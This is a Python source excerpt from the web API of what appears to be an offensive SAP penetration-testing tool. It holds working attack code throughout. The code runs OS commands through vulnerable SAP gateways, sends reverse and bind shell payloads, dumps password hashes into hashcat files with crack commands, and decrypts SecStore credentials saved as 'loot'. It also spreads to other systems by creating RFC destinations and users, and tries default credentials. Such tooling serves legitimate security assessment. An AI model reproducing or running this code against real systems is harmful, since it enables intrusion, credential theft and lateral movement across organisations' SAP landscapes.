                            if existing_insts and inst.zfill(2) not in existing_insts:
                                is_same = False

                        if is_same:
                            conn.target_sid = dest_sid
                            discovered[key]["remote_sid"] = dest_sid
                            api.state.add_connection(conn)
                            time.sleep(0.6)
                            print(f"[*] {conn.destination_name}: "
                                  f"same system as {dest_sid}")
                            continue
                        else:
                            base_sid = dest_sid
                            counter = 1
                            while api.state.get_node(dest_sid):
                                dest_sid = (f"{base_sid}"
                                            f"{counter}")
                                counter += 1
                            print(f"[*] SID {base_sid} exists "
                                  f"with different IP, "
                                  f"using {dest_sid}")

                    # Add new system to map
                    ports = {
                        int(f"32{inst}"): "dispatcher",
                        int(f"33{inst}"): "gateway",
                    }
                    new_inst = InstanceInfo(
                        instance_nr=inst, ip=host,
                        ports=ports)
                    new_node = SAPNode(
                        sid=dest_sid, ip=host,
                        hostname=remote_host,
                        instances=[new_inst])
                    api.state.add_node(new_node)
                    conn.target_sid = dest_sid
                    discovered[key]["remote_sid"] = dest_sid
                    api.state.add_connection(conn)
                    time.sleep(1.2)  # longer pause for new system discovery
                    print(f"[+] Discovered {dest_sid} "
                          f"({remote_host}/{host}, "
                          f"inst {inst}) — added to map")
                else:
                    print(f"[-] {conn.destination_name}: not reachable"
                          f"{' — ' + ping['error'][:60] if ping['error'] else ''}")
                    conn.ping_ok = False
                    conn.tested = True
                    api.state.add_connection(conn)
                    time.sleep(0.4)

            alive = len(discovered)
            print(f"[+] Ping results: {alive} alive systems, "
                  f"{len(non_self) - alive} unreachable")

        _bg(f"{sid}:retrieve_rfcs", "Retrieve RFCs", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/test_rfcs", method="POST")
    def node_test_rfcs(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            creds = node.best_credentials()
            conns = api.state.get_connections_from(sid)
            tested_count = 0
            logon_ok_count = 0
            sap_all_count = 0
            # Only test connections whose target is a known node on the map
            mapped_conns = [c for c in conns
                            if c.target_sid and api.state.get_node(c.target_sid)]
            skipped = len(conns) - len(mapped_conns)
            # Reset tested state so re-clicking "Test RFCs" actually re-tests
            for conn in mapped_conns:
                if conn.tested:
                    conn.tested = False
                    api.state.rfc_check_cache.pop(conn.destination_name, None)
            print(f"[*] RFC Testing: {sid} — {len(mapped_conns)} mapped connection(s) "
                  f"to check{f' ({skipped} unmapped skipped)' if skipped else ''}")
            for conn in mapped_conns:
                if not conn.tested and not api.state.is_rfc_checked(conn.destination_name):
                    print(f"[*] Testing {conn.destination_name}...")
                    result = sapmap_rfc.test_rfc_destination(
                        node, conn.destination_name, creds, api.state.rfc_check_cache
                    )
                    conn.logon_successful = result.get("logon_ok", False)
                    conn.logon_tested = True
                    conn.ping_ok = result.get("ping_ok", False)
                    conn.latency_ms = result.get("latency_ms", 0)
                    conn.tested = True
                    tested_count += 1

                    if conn.logon_successful:
                        logon_ok_count += 1
                        print(f"[+] {conn.destination_name}: Logon successful!")
                        # Mark target
                        target = api.state.get_node(conn.target_sid)
                        if target:
                            target.has_critical_finding = True

                # Only retrieve profiles if logon was successful
                if conn.logon_successful and conn.rfc_user and not conn.profiles:
                    info = sapmap_rfc.get_remote_user_profiles(
                        node, conn.rfc_user, conn.destination_name, creds
                    )
                    conn.profiles = info.get("profiles", [])
                    conn.has_sap_all = info.get("has_sap_all", False)
                    conn.user_detail_error = info.get("error", "")
                    if conn.has_sap_all:
                        sap_all_count += 1
                        print(f"[!] {conn.rfc_user} in {conn.destination_name} has SAP_ALL!")
            print(f"[+] RFC Testing done for {sid}: "
                  f"{tested_count} tested, {logon_ok_count} logon OK, "
                  f"{sap_all_count} with SAP_ALL")
            if tested_count == 0 and mapped_conns:
                print("[*] Possibly no RFC testing done because all RFCs are on the "
                      "RFC check list. Resetting it via the menu might help.")

        _bg(f"{sid}:test_rfcs", "Test RFCs", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/test_rfc_single", method="POST")
    def node_test_rfc_single(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        data = request.json or {}
        dest_name = data.get("destination_name", "")
        if not dest_name:
            return json.dumps({"error": "destination_name required"})

        def _run():
            creds = node.best_credentials()
            conn = None
            for c in api.state.get_connections_from(sid):
                if c.destination_name == dest_name:
                    conn = c
                    break
            if not conn:
                print(f"[-] Connection {dest_name} not found on {sid}")
                return
            # Clear cache so it actually re-tests
            conn.tested = False
            api.state.rfc_check_cache.pop(dest_name, None)
            is_type_t = conn.sapxpg_remote_works or dest_name.startswith("SAPMAP_")

            # If we have a SecStore password, try direct connection to the
            # target first — this bypasses the source system entirely and
            # works even when the source client is locked (SCC4).
            if conn.secstore_password and conn.rfc_user and conn.target_sid:
                target_node = api.state.get_node(conn.target_sid)
                if target_node:
                    target_client = conn.client or "000"
                    target_inst = (target_node.instance_nrs()[0]
                                   if target_node.instance_nrs() else "00")
                    print(f"[*] Testing {dest_name} via direct RFC to "
                          f"{conn.target_sid} (SecStore password)...")
                    direct_creds = Credentials(
                        username=conn.rfc_user,
                        password=conn.secstore_password,
                        client=target_client,
                        instance_nr=target_inst,
                    )
                    try:
                        if sapmap_rfc.test_connection(target_node, direct_creds):
                            conn.logon_successful = True
                            conn.logon_tested = True
                            conn.ping_ok = True
                            conn.tested = True
                            print(f"[+] {dest_name}: Direct logon OK "
                                  f"({conn.rfc_user}@{conn.target_sid})")
                            # Check SAP_ALL via BAPI_USER_GET_DETAIL
                            try:
                                with sapmap_rfc._get_connection(
                                        target_node, direct_creds) as tc:
                                    det = tc.call("BAPI_USER_GET_DETAIL",
                                                  USERNAME=conn.rfc_user)
                                    for p in det.get("PROFILES", []):
                                        if p.get("BAPIPROF") == "SAP_ALL":
                                            conn.has_sap_all = True
                                            print(f"[!] {conn.rfc_user} on "
                                                  f"{conn.target_sid} has SAP_ALL!")
                                            break
                            except Exception:
                                pass
                            return
                    except Exception as e:
                        print(f"[-] Direct test failed: {e}")

            print(f"[*] Testing {'TCP/IP' if is_type_t else 'RFC'} "
                  f"destination: {dest_name}...")
            result = sapmap_rfc.test_rfc_destination(
                node, dest_name, creds, api.state.rfc_check_cache
            )
            conn.latency_ms = result.get("latency_ms", 0)
            conn.tested = True

            if is_type_t:
                # Type T: success = EV_PING_STATUS == 1
                ping_success = result.get("ping_status") == "1"
                conn.ping_ok = ping_success
                conn.logon_successful = ping_success
                conn.logon_tested = True
                conn.sapxpg_remote_works = ping_success
                if ping_success:
                    print(f"[+] {dest_name}: Ping successful! "
                          f"(EV_PING_STATUS=1, latency={conn.latency_ms}ms)")
                    target = api.state.get_node(conn.target_sid)
                    if target:
                        target.has_critical_finding = True
                else:
                    print(f"[-] {dest_name}: Ping failed")
            else:
                # Type 3: success = logon_ok
                conn.logon_successful = result.get("logon_ok", False)
                conn.logon_tested = True
                conn.ping_ok = result.get("ping_ok", False)
                if conn.logon_successful:
                    print(f"[+] {dest_name}: Logon successful!")
                    target = api.state.get_node(conn.target_sid)
                    if target:
                        target.has_critical_finding = True
                    if conn.rfc_user:
                        info = sapmap_rfc.get_remote_user_profiles(
                            node, conn.rfc_user, dest_name, creds
                        )
                        conn.profiles = info.get("profiles", [])
                        conn.has_sap_all = info.get("has_sap_all", False)
                        conn.user_detail_error = info.get("error", "")
                        if conn.has_sap_all:
                            print(f"[!] {conn.rfc_user} in {dest_name} has SAP_ALL!")
                else:
                    err = result.get("error", "")
                    if err:
                        err_short = err.split("\n")[0][:120]
                        print(f"[-] {dest_name}: Logon failed ({err_short})")
                    else:
                        print(f"[-] {dest_name}: Logon failed")
            print(f"[+] Single test done for {dest_name}")

        _bg(f"{sid}:test_rfc:{dest_name}", "Test RFC", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/exec_command", method="POST")
    def node_exec_command(sid):
        """Execute an OS command on a node (synchronous).

        Accepts either:
          - cmdline: raw command (e.g. "ls -la") — auto-wrapped in shell
          - command + params: explicit binary + params (legacy)
        """
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        method = data.get("method", "gateway")  # "gateway" or "sxpg"
        cmdline = data.get("cmdline", "").strip()
        command = data.get("command", "").strip()
        params = data.get("params", "").strip()

        # If cmdline provided, auto-detect OS and wrap in shell
        if cmdline:
            os_type = node.os_type or ""
            # Auto-detect OS if unknown
            if not os_type:
                if method == "sxpg":
                    # Use RFC_SYSTEM_INFO
                    creds = node.best_credentials()
                    if creds:
                        try:
                            with sapmap_rfc._get_connection(
                                    node, creds) as conn:
                                info = conn.call("RFC_SYSTEM_INFO")
                                export = info.get("RFCSI_EXPORT", {})
                                if isinstance(export, dict):
                                    os_type = export.get(
                                        "RFCOPSYS", "").strip()
                        except Exception:
                            pass
                elif method == "gateway" and node.gw_vulnerable:
                    # Probe via GW to detect OS. "ver" is a cmd.exe
                    # built-in (not a standalone exe), so we must use
                    # "cmd.exe /C ver" as full EXTPROG. If it succeeds
                    # with "windows" in output → Windows. If it fails,
                    # try "uname" which works on Linux/Unix.
                    try:
                        probe = sapmap_exploit.execute_gw_command(
                            node, "cmd.exe /C ver", "")
                        if probe.get("success") and probe.get("output"):
                            out_text = " ".join(probe["output"]).lower()
                            if "windows" in out_text:
                                os_type = "Windows NT"
                        if not os_type:
                            probe2 = sapmap_exploit.execute_gw_command(
                                node, "uname", "")
                            if probe2.get("success") and probe2.get("output"):
                                os_type = "Linux"
                        if not os_type:
                            os_type = "Linux"
                    except Exception:
                        os_type = "Linux"
                if os_type:
                    node.os_type = os_type
                    print(f"[*] {sid}: Auto-detected OS: {os_type}")
            is_win = any(w in os_type.lower()
                         for w in ("windows", "nt", "win"))
            if is_win:
                # Windows SAPXPG: full command line goes in EXTPROG,
                # PARAMS left empty (old kernels treat EXTPROG as
                # the full command line, PARAMS gets mangled)
                command = f"cmd.exe /C {cmdline}"
                params = ""
            else:
                command = "/bin/sh"
                # Replace spaces with ${IFS} so SAPXPG doesn't split
                params = "-c " + cmdline.replace(" ", "${IFS}")

        if not command:
            return json.dumps({"error": "No command specified"})

        if method == "gateway":
            if not node.gw_vulnerable:
                return json.dumps({"error": "Gateway not vulnerable on this system"})
            result = sapmap_exploit.execute_gw_command(node, command, params)
        elif method == "sxpg":
            creds = node.best_credentials()
            if not creds:
                return json.dumps({"error": "No credentials available"})
            result = sapmap_rfc.execute_local_command(node, command, params, creds)
        else:
            return json.dumps({"error": f"Unknown method: {method}"})

        return json.dumps(result)

    # -- Reverse Shell endpoints --

    @app.route("/api/shell/detect_ip", method="GET")
    def shell_detect_ip():
        response.content_type = "application/json"
        target = request.params.get("target", "")
        saprouter = request.params.get("saprouter", "")
        ip = _detect_local_ip(target, saprouter)
        return json.dumps({"local_ip": ip})

    @app.route("/api/shell/start", method="POST")
    def shell_start():
        global _shell_session
        response.content_type = "application/json"
        data = request.json or {}
        sid = data.get("sid", "")
        method = data.get("method", "gateway")
        shell_mode = data.get("shell_mode", "reverse")  # "reverse" or "bind"
        shell_port = int(data.get("listen_port", 4444))
        local_ip = data.get("local_ip", "127.0.0.1")

        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        with _shell_lock:
            if _shell_session and _shell_session.status in ("waiting", "connected"):
                return json.dumps({"error": "A shell session is already active. "
                                             "Stop it first."})
            session = ShellSession(shell_port, sid, mode=shell_mode)
            if shell_mode == "reverse":
                session.start_listener()
                if session.status == "error":
                    return json.dumps({"error": session.error_msg})
            else:
                # Bind mode: just set waiting, connector starts after payload
                session.status = "waiting"
            _shell_session = session

        # Generate and send payload in background
        def _send():
            target_host = node.ip or node.hostname
            if shell_mode == "bind":
                payload = _generate_bind_payload(node.os_type, shell_port)
                print(f"[*] {sid}: Sending bind shell payload: "
                      f"{payload['display']}")
                print(f"    Will connect to {target_host}:{shell_port} "
                      f"after payload delivery")
            else:
                payload = _generate_payload(node.os_type, local_ip, shell_port)
                print(f"[*] {sid}: Sending reverse shell payload: "
                      f"{payload['display']}")
                print(f"    Listening on 0.0.0.0:{shell_port}")

            def _exec_step(cmd, params):
                """Execute a single step via GW or SXPG.
                For SXPG, split 'cmd.exe /C ...' into binary + args.
                For GW, full command line goes in EXTPROG.
                """
                if method == "gateway":
                    return sapmap_exploit.execute_gw_command(
                        node, cmd, params)
                else:
                    creds = node.best_credentials()
                    if not creds:
                        return {"success": False,
                                "error": "No credentials"}
                    # SXPG needs binary in EXTPROG, args in PARAMS.
                    # GW payloads put full command in cmd with empty
                    # params. Split at first space for SXPG.
                    if params == "" and " " in cmd:
                        parts = cmd.split(" ", 1)
                        cmd, params = parts[0], parts[1]
                    return sapmap_rfc.execute_local_command(
                        node, cmd, params, creds)

            # Execute pre-steps (e.g. writing script chunks to temp file)
            pre_steps = payload.get("steps", [])
            if pre_steps:
                print(f"[*] {sid}: Writing payload to temp file "
                      f"({len(pre_steps)} chunks)...")
                for step in pre_steps:
                    _exec_step(step["command"], step["params"])

            # Execute the main payload command
            if method != "gateway":
                creds = node.best_credentials()
                if not creds:
                    print(f"[-] {sid}: No credentials for SXPG shell")
                    with _shell_lock:
                        if _shell_session:
                            _shell_session.status = "error"
                            _shell_session.error_msg = "No credentials for SXPG"
                    return
            result = _exec_step(payload["command"], payload["params"])

            if result.get("success"):
                print(f"[+] {sid}: Shell payload delivered")
                if result.get("output"):
                    for line in result["output"][:5]:
                        print(f"    {line}")
                # For bind mode: start connecting to the target
                if shell_mode == "bind":
                    import time
                    time.sleep(2)  # give the bind shell time to start
                    with _shell_lock:
                        if _shell_session and _shell_session.status == "waiting":
                            print(f"[*] {sid}: Connecting to bind shell "
                                  f"at {target_host}:{shell_port}...")
                            _shell_session.start_connector(
                                target_host, node.saprouter)
            else:
                err = result.get("error", "unknown")
                print(f"[-] {sid}: Payload delivery failed: {err}")
                with _shell_lock:
                    if _shell_session and _shell_session.status == "waiting":
                        _shell_session.status = "error"
                        _shell_session.error_msg = f"Payload failed: {err}"

        threading.Thread(target=_send, daemon=True).start()
        return json.dumps({"status": "ok", "port": shell_port,
                           "mode": shell_mode})

    @app.route("/api/shell/status", method="GET")
    def shell_status():
        response.content_type = "application/json"
        with _shell_lock:
            if not _shell_session:
                return json.dumps({"active": False})
            return json.dumps({
                "active": True,
                "status": _shell_session.status,
                "target_sid": _shell_session.target_sid,
                "listen_port": _shell_session.port,
                "client_addr": (f"{_shell_session.client_addr[0]}:"
                                f"{_shell_session.client_addr[1]}"
                                if _shell_session.client_addr else ""),
                "error": _shell_session.error_msg,
            })

    @app.route("/api/shell/output", method="GET")
    def shell_output():
        response.content_type = "application/json"
        with _shell_lock:
            if not _shell_session:
                return json.dumps({"output": ""})
            return json.dumps({"output": _shell_session.get_output()})

    @app.route("/api/shell/input", method="POST")
    def shell_input():
        response.content_type = "application/json"
        data = request.json or {}
        text = data.get("text", "")
        with _shell_lock:
            if not _shell_session or _shell_session.status != "connected":
                return json.dumps({"error": "No active shell"})
            _shell_session.send_input(text)
        return json.dumps({"status": "ok"})

    @app.route("/api/shell/stop", method="POST")
    def shell_stop():
        global _shell_session
        response.content_type = "application/json"
        with _shell_lock:
            if _shell_session:
                _shell_session.stop()
                _shell_session = None
        return json.dumps({"status": "ok"})

    @app.route("/api/node/<sid>/download_hashes", method="POST")
    def node_download_hashes(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            creds = node.best_credentials()
            hashes = sapmap_rfc.download_password_hashes(node, creds)
            if not hashes:
                return

            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            states_dir = os.path.join(os.path.dirname(__file__), "states")
            os.makedirs(states_dir, exist_ok=True)

            # Save raw JSON
            json_file = os.path.join(states_dir, f"hashes_{sid}_{ts}.json")
            with open(json_file, "w") as f:
                json.dump(hashes, f, indent=2)

            quality = hashes[0].get("hash_quality", "half") if hashes else "half"

            # Generate hashcat-format files
            bcode_lines = []    # mode 7700 (full) or 7701 (half)
            passcode_lines = [] # mode 7800 (full) or 7801 (half)
            issha_lines = []    # mode 10300

            for row in hashes:
                bname = row.get("BNAME", "").strip()
                bcode = row.get("BCODE", "").strip()
                passcode = row.get("PASSCODE", "").strip()
                pwdsaltedhash = row.get("PWDSALTEDHASH", "").strip()

                if bcode and bname:
                    if quality == "full":
                        # Mode 7700: USERNAME$FULL_HEX_HASH
                        bcode_lines.append(f"{bname}${bcode}")
                    else:
                        # Mode 7701: USERNAME$HALF_HEX_HASH_PADDED
                        padded = bcode.ljust(16, '0')
                        bcode_lines.append(f"{bname}${padded}")

                if passcode and bname:
                    if quality == "full":
                        # Mode 7800: USERNAME$FULL_SHA1_HEX
                        passcode_lines.append(f"{bname}${passcode}")
                    else:
                        # Mode 7801: USERNAME$HALF_SHA1_PADDED
                        padded = passcode.ljust(40, '0')
                        passcode_lines.append(f"{bname}${padded}")

                if pwdsaltedhash:
                    # Mode 10300: raw value as-is
                    issha_lines.append(pwdsaltedhash)

            # Write hashcat files
            files_written = []
            bcode_mode = "7700" if quality == "full" else "7701"
            passcode_mode = "7800" if quality == "full" else "7801"

            if bcode_lines:
                f_bcode = os.path.join(states_dir,
                    f"hashcat_{sid}_bcode_m{bcode_mode}_{ts}.txt")
                with open(f_bcode, "w") as f:
                    f.write("\n".join(bcode_lines) + "\n")
                files_written.append(
                    f"BCODE (mode {bcode_mode}): {f_bcode}")

            if passcode_lines:
                f_passcode = os.path.join(states_dir,
                    f"hashcat_{sid}_passcode_m{passcode_mode}_{ts}.txt")
                with open(f_passcode, "w") as f:
                    f.write("\n".join(passcode_lines) + "\n")
                files_written.append(
                    f"PASSCODE (mode {passcode_mode}): {f_passcode}")

            if issha_lines:
                f_issha = os.path.join(states_dir,
                    f"hashcat_{sid}_issha_m10300_{ts}.txt")
                with open(f_issha, "w") as f:
                    f.write("\n".join(issha_lines) + "\n")
                files_written.append(
                    f"PWDSALTEDHASH (mode 10300): {f_issha}")

            # Summary
            print(f"[+] {sid}: Extracted {len(hashes)} users "
                  f"({quality} hashes)")
            print(f"    Raw JSON: {json_file}")
            for fw in files_written:
                print(f"    {fw}")
            if bcode_lines:
                print(f"    Crack BCODE: hashcat -m {bcode_mode} "
                      f"hashcat_{sid}_bcode_m{bcode_mode}_{ts}.txt "
                      f"wordlist.txt")
            if passcode_lines:
                print(f"    Crack PASSCODE: hashcat -m {passcode_mode} "
                      f"hashcat_{sid}_passcode_m{passcode_mode}_{ts}.txt "
                      f"wordlist.txt")
            if issha_lines:
                print(f"    Crack iSSHA: hashcat -m 10300 "
                      f"hashcat_{sid}_issha_m10300_{ts}.txt "
                      f"wordlist.txt")

        _bg(f"{sid}:download_hashes", "Extract Hashes", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/download_table", method="POST")
    def node_download_table(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            creds = node.best_credentials()
            table = data.get("table", "")
            fields = data.get("fields", [])
            where = data.get("where", "")
            max_rows = data.get("max_rows", 500)
            rows = sapmap_rfc.read_table(node, table, fields, where, max_rows, creds)
            if rows:
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                outfile = os.path.join(
                    os.path.dirname(__file__), "states",
                    f"table_{table}_{sid}_{ts}.json"
                )
                os.makedirs(os.path.dirname(outfile), exist_ok=True)
                with open(outfile, "w") as f:
                    json.dump(rows, f, indent=2)
                print(f"[+] {len(rows)} rows from {table} saved to {outfile}")

        _bg(f"{sid}:download_table", "Download Table", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/download_secstore", method="POST")
    def node_download_secstore(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        key_hex = data.get("key_hex", "") or sapmap_secstore.DEFAULT_KEY_HEX

        def _run():
            creds = node.best_credentials()
            try:
                results = sapmap_secstore.download_and_decrypt(
                    node, creds, key_hex, state=api.state)
                sapmap_secstore.integrate_results(node, api.state, results)
                ok  = [r for r in results if not r.get("error") and r.get("password")]
                err = [r for r in results if r.get("error")]
                states_dir = os.path.join(os.path.dirname(__file__), "states")
                outfile = sapmap_secstore.save_loot(node.sid, results, states_dir)
                print(f"[+] SecStore {sid}: {len(results)} entries, "
                      f"{len(ok)} decrypted, {len(err)} errors → {outfile}")
            except Exception as e:
                import traceback
                print(f"[-] SecStore {sid}: {e}")
                traceback.print_exc()

        _bg(f"{sid}:download_secstore", "Download SecStore", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/create_tcpip_dest", method="POST")
    def node_create_tcpip(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        target_sid = data.get("target_sid", "")
        tgt_node = api.state.get_node(target_sid) if target_sid else None
        if not tgt_node:
            return json.dumps({"error": f"Target system {target_sid} not found"})

        def _run():
            creds = node.best_credentials()
            if not creds:
                print(f"[-] No credentials available for {sid}")
                return
            tgt_host = tgt_node.ip or tgt_node.hostname
            # Find gateway port on target
            gw_port = ""
            for inst in tgt_node.instances:
                for port, svc in inst.ports.items():
                    if svc == "gateway" or (3300 <= port <= 3399):
                        gw_port = str(port)
                        break
                if gw_port:
                    break
            if not gw_port:
                nrs = tgt_node.instance_nrs()
                gw_port = f"33{nrs[0]}" if nrs else "3300"
            print(f"[*] Creating TCP/IP dest from {sid} → "
                  f"{target_sid} ({tgt_host}, gw={gw_port})...")
            result = sapmap_rfc.create_tcpip_destination(
                node, tgt_host, target_sid=target_sid,
                target_gw_port=gw_port, creds=creds
            )
            if not result["success"]:
                print(f"[-] Failed: {result['message']}")
                return
            dest_name = result["dest_name"]
            print(f"[+] Created: {dest_name} on {sid}")

            # Track for cleanup (in-memory + persistent file)
            entry = {
                "dest_name": dest_name,
                "source_sid": sid,
                "target_sid": target_sid,
                "target_host": tgt_host,
                "gw_port": gw_port,
                "created_at": datetime.now().isoformat(),
            }
            api.state.created_destinations.append(entry)
            state_mgr.save_created_destination(entry)

            # Test the destination with /SDF/RFC_CHECK
            print(f"[*] Testing {dest_name} with /SDF/RFC_CHECK...")
            check = sapmap_rfc.test_rfc_destination(
                node, dest_name, creds, api.state.rfc_check_cache
            )

            # For TCP/IP destinations, success = EV_PING_STATUS == 1
            ping_success = check.get("ping_status") == "1"

            # Create connection and add to state
            conn = RFCConnection(
                source_sid=sid,
                source_host=node.ip or node.hostname,
                target_sid=target_sid,
                target_host=tgt_host,
                target_ip=tgt_node.ip,
                destination_name=dest_name,
                logon_successful=ping_success,
                ping_ok=ping_success,
                latency_ms=check.get("latency_ms", 0),
                tested=True,
                sapxpg_remote_works=ping_success,
            )
            api.state.add_connection(conn)

            if ping_success:
                print(f"[+] {dest_name}: Ping successful! "
                      f"(EV_PING_STATUS=1, latency={conn.latency_ms}ms)")
                tgt_node.has_critical_finding = True
            else:
                print(f"[-] {dest_name}: Ping failed — "
                      f"{check.get('logon_message', check.get('error', ''))}")

        _bg(f"{sid}:create_tcpip", "Create TCP/IP Dest", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/propagate", method="POST")
    def node_propagate(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        target_sid = data.get("target_sid", None)

        def _run():
            sapmap_exploit.propagate_from_node(
                node, api.state, target_sid=target_sid
            )

        _bg(f"{sid}:propagate", "Propagate", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/create_user_via_rfc", method="POST")
    def node_create_user_via_rfc(sid):
        """Create a remote user on a target system via a specific RFC destination."""
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        dest_name = data.get("destination_name", "")
        target_sid = data.get("target_sid", "")
        if not dest_name or not target_sid:
            return json.dumps({"error": "destination_name and target_sid required"})

        def _run():
            sapmap_exploit.propagate_from_node(
                node, api.state, target_sid=target_sid,
                destination_name=dest_name
            )

        _bg(f"{sid}:create_user_rfc:{dest_name}", "Create User via RFC", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/cleanup", method="POST")
    def node_cleanup(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            sapmap_cleanup.cleanup_node_users(node, api.state)

        _bg(f"{sid}:cleanup", "Cleanup Users", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_router_info", method="POST")
    def node_check_router_info(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            from sap_router_info import saprouter_info_request
            host = node.ip or node.hostname
            if not host:
                print(f"[-] {sid}: No IP/hostname available")
                return

            # Find SAProuter port (default 3299)
            router_port = 3299
            for inst in node.instances:
                for port, svc in inst.ports.items():
                    if svc == "saprouter":
                        router_port = port
                        break

            print(f"[*] {sid}: Checking SAProuter info leak on "
                  f"{host}:{router_port}...")
            result = saprouter_info_request(host, router_port, timeout=10)
            node.saprouter_info = result

            if result["vulnerable"]:
                print(f"[+] {sid}: SAProuter is VULNERABLE to info leak!")
                print(f"    Working dir: {result['working_dir']}")
                print(f"    Routtab: {result['routtab']}")
                print(f"    Connected clients: {result['total_clients']}")
                for c in result['clients']:
                    print(f"      {c['source']} → {c['destination']}")
                node.has_critical_finding = True
            else:
                print(f"[*] {sid}: SAProuter info leak not available "
                      f"({result['error']})")

        _bg(f"{sid}:check_router_info", "Check SAProuter Info", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/enum_clients", method="POST")
    def node_enum_clients(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            host = node.ip or node.hostname
            if not host:
                print(f"[-] {sid}: No IP/hostname available")
                return

            # Find dispatcher port (32XX)
            disp_port = None
            for inst in node.instances:
                for port, svc in inst.ports.items():
                    if svc == "dispatcher" or (3200 <= port <= 3299):
                        disp_port = port
                        break
                if disp_port:
                    break
            if not disp_port:
                print(f"[-] {sid}: No dispatcher port found (need 32XX for DIAG)")
                return

            clients = sapmap_scanner.enumerate_system_clients(
                host, disp_port, sid_hint=node.sid,
                saprouter=node.saprouter)
            if clients:
                # Merge with existing clients (avoid duplicates)
                existing_nrs = set()
                for c in node.clients:
                    nr = c.get("nr") if isinstance(c, dict) else str(c)
                    existing_nrs.add(nr)
                for nr in clients:
                    if nr not in existing_nrs:
                        node.clients.append({"nr": nr, "category": ""})

        _bg(f"{sid}:enum_clients", "Enumerate Clients", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_default_creds", method="POST")
    def node_check_default_creds(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            try:
                from sap_default_creds import check_default_credentials
            except ImportError:
                print(f"[-] {sid}: sap_default_creds module not available")
                return

            host = node.ip or node.hostname
            if not host:
                print(f"[-] {sid}: No IP/hostname available")
                return

            # Find dispatcher port (32XX)
            disp_port = None
            for inst in node.instances:
                for port, svc in inst.ports.items():
                    if svc == "dispatcher" or (3200 <= port <= 3299):
                        disp_port = port
                        break
                if disp_port:
                    break
            if not disp_port:
                print(f"[-] {sid}: No dispatcher port found (need 32XX for DIAG)")
                return

            # Get client list
            clients = []
            for c in node.clients:
                nr = c.get("nr") if isinstance(c, dict) else str(c)
                if nr:
                    clients.append(nr)
            if not clients:
                clients = ["000"]
                print(f"[*] {sid}: No clients enumerated, testing client 000 only")

            print(f"[*] {sid}: Checking default accounts on {host}:{disp_port} "
                  f"(clients: {', '.join(clients)})...")
            print(f"[!] {sid}: WARNING — failed login attempts may lock accounts!")

            if node.saprouter:
                print(f"[*] {sid}: Routing DIAG via SAProuter: {node.saprouter}")
            findings = check_default_credentials(
                host, disp_port, clients, timeout=10, verbose=True,
                saprouter=node.saprouter)

            if findings:
                print(f"[+] {sid}: Found {len(findings)} default credential(s)!")
                for f in findings:
                    # Add as credentials on the node
                    cred = Credentials(
                        username=f["username"], password=f["password"],
                        client=f["client"],
                        instance_nr=node.instance_nrs()[0] if node.instance_nrs() else "00",
                        verified=(f["result"] == "SUCCESS"),
                    )
                    already = any(
                        c.username == cred.username and c.client == cred.client
                        for c in node.credentials
                    )
                    if not already:
                        node.credentials.append(cred)
                        print(f"    [{f['severity']}] {f['username']}:{f['password']} "
                              f"client {f['client']} — {f['detail']}")
            else:
                print(f"[*] {sid}: No default credentials found")

        _bg(f"{sid}:default_creds", "Check Default Accounts", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/client_roles", method="POST")
    def node_client_roles(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            creds = node.best_credentials()
            sapmap_rfc.update_node_production_status(node, creds)

        _bg(f"{sid}:client_roles", "Client Roles", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>", method="DELETE")
    def node_delete(sid):
        response.content_type = "application/json"
        if api.state.remove_node(sid):
            print(f"[*] Removed system {sid} from the map")
            return json.dumps({"status": "ok"})
        return json.dumps({"error": f"Node {sid} not found"})

    @app.route("/api/node/add", method="POST")
    def node_add():
        response.content_type = "application/json"
        data = request.json or {}
        sid = (data.get("sid") or "").strip().upper()
